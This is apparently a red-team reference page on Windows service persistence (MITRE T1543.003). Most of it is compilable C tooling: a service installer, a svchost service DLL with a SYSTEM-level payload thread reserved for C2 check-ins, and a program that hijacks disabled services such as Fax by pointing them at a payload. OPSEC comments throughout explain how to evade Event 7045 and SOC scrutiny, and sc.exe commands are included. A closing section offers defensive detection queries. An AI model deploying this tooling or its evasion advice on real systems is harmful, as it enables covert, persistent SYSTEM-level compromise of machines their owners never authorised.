# Windows Service Persistence - Code Implementations

MITRE ATT&CK: T1543.003 - Create or Modify System Process: Windows Service

> **Authorized security testing only.** These code patterns are reference material for red team professionals operating under explicit written authorization.

## Overview

Windows services are long-running processes managed by the Service Control Manager (SCM). From a persistence perspective, services offer SYSTEM-level execution, automatic start at boot, and crash recovery. The tradeoff is that service creation and modification generate well-known, high-fidelity detection events (System Event 7045, Sysmon Event 13). This file covers both the "create new service" approach and the stealthier "modify existing service" alternative.

See also: [Service Persistence (Narrative)](../../04-persistence/service-persistence.md)

## Windows Service Architecture

```
+---------------------+
| Service Control     |
| Manager (SCM)       |
| services.exe        |
+----------+----------+
           |
           | Reads service configuration from registry:
           | HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
           |
    +------+------+----------------------+
    |             |                      |
+---+---+   +----+----+          +------+------+
| Type 1|   | Type 2  |          | Type 3      |
| EXE   |   | DLL     |          | Kernel      |
| svc   |   | svc     |          | Driver      |
|       |   |         |          |             |
| Own   |   | Loaded  |          | Loaded by   |
| proc  |   | into    |          | kernel      |
|       |   | svchost |          |             |
+-------+   +---------+          +-------------+

SERVICE TYPES (dwServiceType):
  SERVICE_WIN32_OWN_PROCESS   (0x10) -- standalone EXE
  SERVICE_WIN32_SHARE_PROCESS (0x20) -- DLL loaded by svchost.exe
  SERVICE_KERNEL_DRIVER       (0x01) -- kernel driver (.sys)
  SERVICE_FILE_SYSTEM_DRIVER  (0x02) -- file system driver

START TYPES (dwStartType):
  SERVICE_AUTO_START   (0x02) -- starts at boot (most useful for persistence)
  SERVICE_BOOT_START   (0x00) -- loaded by boot loader (kernel drivers only)
  SERVICE_DEMAND_START (0x03) -- manual start only
  SERVICE_DISABLED     (0x04) -- cannot be started
  SERVICE_SYSTEM_START (0x01) -- started by IoInitSystem

REGISTRY STRUCTURE (each service):
  HKLM\SYSTEM\CurrentControlSet\Services\<Name>
    Type         REG_DWORD   (service type)
    Start        REG_DWORD   (start type)
    ErrorControl REG_DWORD   (what to do on failure)
    ImagePath    REG_EXPAND_SZ (path to EXE or driver)
    DisplayName  REG_SZ      (friendly name)
    Description  REG_SZ      (description)
    ObjectName   REG_SZ      (account: LocalSystem, etc.)

  For shared-process DLL services, additionally:
    Parameters\ServiceDll  REG_EXPAND_SZ  (path to the DLL)
```

## C Implementation: Service Installer (CreateServiceW)

```c
/*
 * service_install.c -- Creates a new Windows service using the SCM API.
 * DETECTION: System Event 7045 (primary), Sysmon Event 13 (registry),
 *   Security Event 4697 (if audited). Service name + binary path in cleartext.
 * OPSEC: Very noisy. Event 7045 is high-fidelity. Use legitimate-looking names
 *   and paths. Consider modifying an existing service instead (see below).
 * Compile: cl.exe /W4 /Fe:svcinstall.exe service_install.c advapi32.lib
 */

#include <windows.h>
#include <stdio.h>

int InstallService(
    LPCWSTR serviceName,
    LPCWSTR displayName,
    LPCWSTR binaryPath,
    LPCWSTR description,
    DWORD   startType      /* SERVICE_AUTO_START for persistence */
) {
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;
    SERVICE_DESCRIPTIONW sd;

    /* Open SCM with create permission (some EDR products log this access) */
    hSCM = OpenSCManagerW(
        NULL,                       /* Local machine */
        NULL,                       /* Active database (SERVICES_ACTIVE_DATABASE) */
        SC_MANAGER_CREATE_SERVICE   /* Required to call CreateServiceW */
    );
    if (!hSCM) {
        printf("[!] OpenSCManager failed: %lu (need admin)\n", GetLastError());
        return -1;
    }

    /* CreateServiceW -- THIS generates Event 7045.
     * OPSEC: binaryPath appears in cleartext in the event and registry. */
    hService = CreateServiceW(
        hSCM,
        serviceName,                /* Internal service name (used by sc.exe) */
        displayName,                /* Display name (shown in services.msc) */
        SERVICE_ALL_ACCESS,         /* Desired access to the service object */
        SERVICE_WIN32_OWN_PROCESS,  /* Service type */
        startType,                  /* Start type */
        SERVICE_ERROR_IGNORE,       /* Error control */
        binaryPath,                 /* Path to service binary */
        NULL,                       /* Load order group (NULL = none) */
        NULL,                       /* Tag ID (NULL for non-driver services) */
        NULL,                       /* Dependencies (NULL = none) */
        NULL,                       /* Account (NULL = LocalSystem) */
        NULL                        /* Password (NULL for LocalSystem) */
    );

    if (!hService) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            printf("[*] Service already exists.\n");
        } else {
            printf("[!] CreateServiceW failed: %lu\n", err);
        }
        CloseServiceHandle(hSCM);
        return -1;
    }

    /* STEP 3: Set the service description.
     * OPSEC: A service without a description stands out in services.msc.
     * Always set a plausible description. */
    sd.lpDescription = (LPWSTR)description;
    ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &sd);

    printf("[+] Service '%ls' created successfully.\n", serviceName);
    printf("[+] Binary path: %ls\n", binaryPath);
    printf("[+] Start type: %s\n",
           startType == SERVICE_AUTO_START ? "Auto" : "Manual");

    /* Optionally start the service immediately */
    /* StartServiceW(hService, 0, NULL); */

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return 0;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 3) {
        printf("Usage: svcinstall.exe <serviceName> <binaryPath>\n");
        return 1;
    }
    return InstallService(
        argv[1],
        argv[1],    /* Use same name for display -- customize in production */
        argv[2],
        L"Provides diagnostic and configuration services for system components.",
        SERVICE_AUTO_START
    );
}
```

## C Implementation: Service DLL Skeleton

```c
/*
 * service_dll.c -- DLL loaded by svchost.exe (SERVICE_WIN32_SHARE_PROCESS).
 * Must export ServiceMain; must handle service control requests properly.
 *
 * Registry setup:
 *   HKLM\...\Services\<Name>  Type=0x20, Start=0x02,
 *     ImagePath="%SystemRoot%\System32\svchost.exe -k netsvcs"
 *   HKLM\...\Services\<Name>\Parameters  ServiceDll="C:\...\malicious.dll"
 *   Also append service name to HKLM\...\Svchost\netsvcs (REG_MULTI_SZ).
 *
 * DETECTION: Event 7045, Sysmon 13 (ServiceDll value), Sysmon 7 (DLL load).
 * OPSEC: Runs inside svchost.exe (legitimate), but ServiceDll is well-known IOC.
 *
 * Compile: cl.exe /W4 /LD /Fe:diagsvc.dll service_dll.c advapi32.lib
 */
#include <windows.h>

#define SERVICE_NAME L"DiagTrackSvc"

static SERVICE_STATUS_HANDLE g_hStatus = NULL;
static SERVICE_STATUS g_Status = {0};
static HANDLE g_hStopEvent = NULL;

DWORD WINAPI PayloadThread(LPVOID p) {
    (void)p;
    /* Runs as SYSTEM. Check g_hStopEvent periodically for clean shutdown. */
    while (WaitForSingleObject(g_hStopEvent, 30000) == WAIT_TIMEOUT) {
        /* Payload activity here (C2 check-in, tasking, etc.) */
    }
    return 0;
}

DWORD WINAPI ServiceCtrlHandler(DWORD ctl, DWORD t, LPVOID d, LPVOID c) {
    (void)t; (void)d; (void)c;
    if (ctl == SERVICE_CONTROL_STOP || ctl == SERVICE_CONTROL_SHUTDOWN) {
        g_Status.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_hStatus, &g_Status);
        SetEvent(g_hStopEvent);
    } else if (ctl == SERVICE_CONTROL_INTERROGATE) {
        SetServiceStatus(g_hStatus, &g_Status);
    }
    return NO_ERROR;
}

/* OPSEC: If ServiceMain fails to register a handler and report status,
 * SCM marks the service as failed, generating error events. Always
 * implement proper lifecycle: PENDING -> RUNNING -> STOPPED. */
void WINAPI ServiceMain(DWORD argc, LPWSTR* argv) {
    (void)argc; (void)argv;
    g_hStatus = RegisterServiceCtrlHandlerExW(SERVICE_NAME, ServiceCtrlHandler, NULL);
    if (!g_hStatus) return;

    g_Status.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    g_Status.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(g_hStatus, &g_Status);

    g_hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    g_Status.dwCurrentState = SERVICE_RUNNING;
    g_Status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    SetServiceStatus(g_hStatus, &g_Status);

    HANDLE hThread = CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    WaitForSingleObject(g_hStopEvent, INFINITE);
    if (hThread) { WaitForSingleObject(hThread, 5000); CloseHandle(hThread); }

    g_Status.dwCurrentState = SERVICE_STOPPED;
    g_Status.dwControlsAccepted = 0;
    SetServiceStatus(g_hStatus, &g_Status);
}

BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    (void)h; (void)p;
    if (r == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(h);
    return TRUE;
}
```

## C Implementation: Modifying an Existing Service (Stealthier)

```c
/*
 * service_modify.c -- Modifies existing service's binary path (stealthier).
 * KEY ADVANTAGE: ChangeServiceConfigW does NOT generate Event 7045.
 * Only Sysmon Event 13 for the ImagePath registry change.
 * Good targets: Fax, XblGameSave, WMPNetworkSvc, RetailDemo (all disabled by default).
 * OPSEC: Save original ImagePath for cleanup. Sysmon 13 still fires.
 * Compile: cl.exe /W4 /Fe:svcmod.exe service_modify.c advapi32.lib
 */

#include <windows.h>
#include <stdio.h>

int ModifyExistingService(
    LPCWSTR serviceName,
    LPCWSTR newBinaryPath,
    DWORD   newStartType
) {
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;

    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) {
        printf("[!] OpenSCManager failed: %lu\n", GetLastError());
        return -1;
    }

    /* Open the existing service with configuration change permission.
     * OPSEC: SERVICE_CHANGE_CONFIG is the minimum access needed.
     * Requesting SERVICE_ALL_ACCESS would be more suspicious in
     * process access logs. */
    hService = OpenServiceW(hSCM, serviceName, SERVICE_CHANGE_CONFIG |
                            SERVICE_QUERY_CONFIG | SERVICE_START);
    if (!hService) {
        printf("[!] OpenService failed: %lu\n", GetLastError());
        CloseServiceHandle(hSCM);
        return -1;
    }

    /* Query current config first for logging / cleanup purposes.
     * OPSEC: Record the original values so you can restore them
     * during post-engagement cleanup. */
    DWORD needed = 0;
    QueryServiceConfigW(hService, NULL, 0, &needed);
    LPQUERY_SERVICE_CONFIGW pConfig = (LPQUERY_SERVICE_CONFIGW)malloc(needed);
    if (pConfig && QueryServiceConfigW(hService, pConfig, needed, &needed)) {
        printf("[*] Original ImagePath: %ls\n",
               pConfig->lpBinaryPathName ? pConfig->lpBinaryPathName : L"(null)");
        printf("[*] Original StartType: %lu\n", pConfig->dwStartType);
    }
    free(pConfig);

    /* ChangeServiceConfigW: modify the service configuration.
     *
     * DETECTION: This does NOT generate Event 7045.
     * It DOES modify registry values under:
     *   HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
     * Sysmon Event 13 fires for ImagePath and Start value changes.
     *
     * SERVICE_NO_CHANGE (0xFFFFFFFF) means "keep the existing value"
     * for any parameter we do not want to modify. */
    BOOL success = ChangeServiceConfigW(
        hService,
        SERVICE_NO_CHANGE,      /* dwServiceType: keep existing */
        newStartType,           /* dwStartType: change to AUTO_START */
        SERVICE_NO_CHANGE,      /* dwErrorControl: keep existing */
        newBinaryPath,          /* lpBinaryPathName: OUR PAYLOAD PATH */
        NULL,                   /* lpLoadOrderGroup: no change */
        NULL,                   /* lpdwTagId: no change */
        NULL,                   /* lpDependencies: no change */
        NULL,                   /* lpServiceStartName: keep existing account */
        NULL,                   /* lpPassword: no change */
        NULL                    /* lpDisplayName: keep existing */
    );

    if (success) {
        printf("[+] Service '%ls' modified successfully.\n", serviceName);
        printf("[+] New binary path: %ls\n", newBinaryPath);

        /* Optionally start the service now */
        /* StartServiceW(hService, 0, NULL); */
    } else {
        printf("[!] ChangeServiceConfigW failed: %lu\n", GetLastError());
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return success ? 0 : -1;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 3) {
        printf("Usage: svcmod.exe <existingServiceName> <newBinaryPath>\n");
        printf("Example: svcmod.exe Fax C:\\Windows\\Temp\\svc.exe\n");
        return 1;
    }
    return ModifyExistingService(argv[1], argv[2], SERVICE_AUTO_START);
}
```

## OPSEC Comparison: New Service vs. Modified Service

| Artifact | New Service (CreateServiceW) | Modified Service (ChangeServiceConfigW) |
|---|---|---|
| System Event 7045 | YES (high signal) | **NO** -- key advantage |
| Security Event 4697 | YES (if audited) | NO |
| Sysmon Event 13 | YES (multiple keys) | YES (ImagePath only) |
| Visible in services.msc / Autoruns | YES (new entry) | YES (existing, changed path) |
| Baseline deviation | HIGH | MEDIUM |

**Recommendation:** Modifying a disabled/rarely-used service avoids Event 7045, which is the primary SOC trigger for service persistence investigations.

## sc.exe vs. API (Quick Reference)

```powershell
# sc.exe creates process with logged command line -- trivially detectable
sc.exe create DiagSvc binPath= "C:\Windows\Temp\svc.exe" start= auto
sc.exe config Fax binPath= "C:\Windows\Temp\svc.exe" start= auto
# API approach (CreateServiceW / ChangeServiceConfigW) avoids spawning sc.exe
```

## Detection Indicators

- **System Event 7045** (highest fidelity): fires for CreateServiceW/sc.exe create, captures ServiceName, ImagePath, StartType, AccountName. Does NOT fire for ChangeServiceConfigW.
- **Sysmon Event 13**: registry writes to `Services\<Name>\ImagePath`, `Start`, `Type`. Modified services generate fewer events (only changed values).
- **Sysmon Event 7**: DLL loaded by svchost.exe from unexpected path (service DLL variant).

### Detection Queries (Splunk SPL)

```
# New services from unusual paths
index=wineventlog source="System" EventCode=7045
| where NOT match(ImagePath, "(?i)^(C:\\\\Windows\\\\System32|C:\\\\Windows\\\\SysWOW64)")
| table _time, ServiceName, ImagePath, StartType, AccountName

# Service binary path changes via Sysmon
index=sysmon EventCode=13 TargetObject="*\\Services\\*\\ImagePath"
| rex field=TargetObject "Services\\\\(?<ServiceName>[^\\\\]+)\\\\ImagePath"
| table _time, Image, ServiceName, Details, User

# Unusual ServiceDll values
index=sysmon EventCode=13 TargetObject="*\\Services\\*\\Parameters\\ServiceDll"
  NOT Details IN ("*\\System32\\*", "*\\SysWOW64\\*")
| table _time, Image, TargetObject, Details
```

## Cross-References

- [Service Persistence (Narrative)](../../04-persistence/service-persistence.md)
- [Registry Persistence (Code)](registry-persistence-code.md) -- lighter-weight alternative
- [DLL Hijack Discovery (Code)](dll-hijack-discovery.md) -- service DLL hijacking
- [Scheduled Task Creation (Code)](scheduled-task-creation.md) -- alternative SYSTEM-level persistence
- [Detection Engineering](../../12-detection-engineering/)
